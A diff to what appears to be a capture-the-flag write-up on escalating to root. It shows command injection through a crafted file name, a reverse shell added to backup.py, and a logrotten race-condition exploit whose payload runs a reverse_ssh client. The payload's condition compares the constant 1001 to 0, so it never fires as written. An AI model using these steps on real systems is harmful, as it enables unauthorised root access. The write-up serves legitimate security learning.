@@ -54,4 +54,25 @@ A fairly hard room, largely due to the breadth of the enumeration and its numero
     
 10. To exploit this, as we have write into `/var/www/uploadedfiles/filedir/`, we can create a file in there like `$(chmod -R 777 ~)`. This can be done with `touch \$\(chmod\ -R\ 777\ \~\)` in that folder. Within a minute, all files in plot_admin's home directory will be universally writable.
 11. Next, adding `os.system("/path/to/revshell")` into backup.py (after removing the chmod file above, as it breaks the script) will get a reverse shell as plot_admin.
-12. https://github.com/whotwagner/logrotten
+
+> the root privesc seemed *real* flaky, and I tried over multiple restarts to get it to work, only persisting once I checked and my approach *is* intended. So, just be aware that this might require a few goes.
+
+13. Careful enumeration or using pspy will reveal logrotate is being used with a custom config file at `/etc/logbackup.cfg`. The contents of this are:
+
+    ```
+    /home/plot_admin/.logs_backup/moodle_access {
+        hourly
+        missingok
+        rotate 50
+        create
+    }
+    ```
+    
+14. THis suggests a [logrotten](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition) vulnerability, since we control that directory as plot_admin. Basically we can swap out the file being created/updated due to a race condition, plonk a payload into bash completion, and when the root user logs in they will trigger the payload and grant us a shell. Enumeration shows we don't have to wait - the root user is executing what they find in bash completion on a schedule.
+15. To abuse this, I used https://github.com/whotwagner/logrotten. My payload file triggered a reverse_ssh client. In order to trigger the log rotate, you need to modify the moodle_access backup file - this can all be done in a few lines like so (run from plotadmin's home folder, where client and logrotten (compiled) have been placed:
+
+    ```
+    echo 'if [ 1001 -eq 0 ]; then (/home/plot_admin/client &); fi' > payloadfile
+    cp .logs_backup/02.06.2022 .logs_backup/moodle_access; ./logrotten -p payloadfile -d /home/plot_admin/.logs_backup/moodle_access
+    ```
+17. And after a few minutes (or rather, five or so restarts and many hours of waiting) boom root!
